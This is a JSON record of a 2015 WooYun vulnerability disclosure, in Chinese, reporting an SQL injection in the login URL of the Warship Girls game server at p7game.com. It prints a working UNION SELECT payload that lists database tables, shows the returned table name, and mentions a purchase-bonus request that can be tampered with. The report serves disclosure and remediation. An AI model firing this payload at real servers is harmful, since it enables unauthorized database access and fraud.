{"id": 27125, "wybug_id": "wooyun-2015-0112612", "wybug_title": "战舰少女游戏服务器SQL 注入", "wybug_corp": "p7game.com", "wybug_author": "Hen", "wybug_date": "2015-05-07 13:25", "wybug_open_date": "2015-06-21 13:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 舰N游戏服务器SQL注入 详细说明：  抓包得到战舰少女手游服务器登录地址，http://login.alpha.p7game.com/index/passportLogin/USER/PASS用户名的地方可以可以注入。。   漏洞证明：  访问下面这个链接：\nhttp://login.alpha.p7game.com/index/passportLogin/xxxxxxxxxxxxxxxxxx' union select 'hentest123123', 'B', 'f54d9efb090e6693ebe289679ecea758', 'D', 'E', hex(table_name), 'G', 'H', 'I', 'J' from (select table_name from information_schema.tables where table_schema='ship_basic' order by table_schema limit 0,1) as nouse;--/henHENhenHEN\n\n\n可以看到页面的返回数据\"cellphone\":\"61646D696E5F636F6C756D6E\"decode(\"hex\")之后是admin_column也就是得到了ship_basic的第一个表名是admin_column   修复方案：  用户名那个地方做好过滤。。&好像首冲双倍可以修改请求变成每次都双倍，恩。。。那个请求的逻辑也改下吧= =。。。   版权声明：转载请注明来源 Hen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}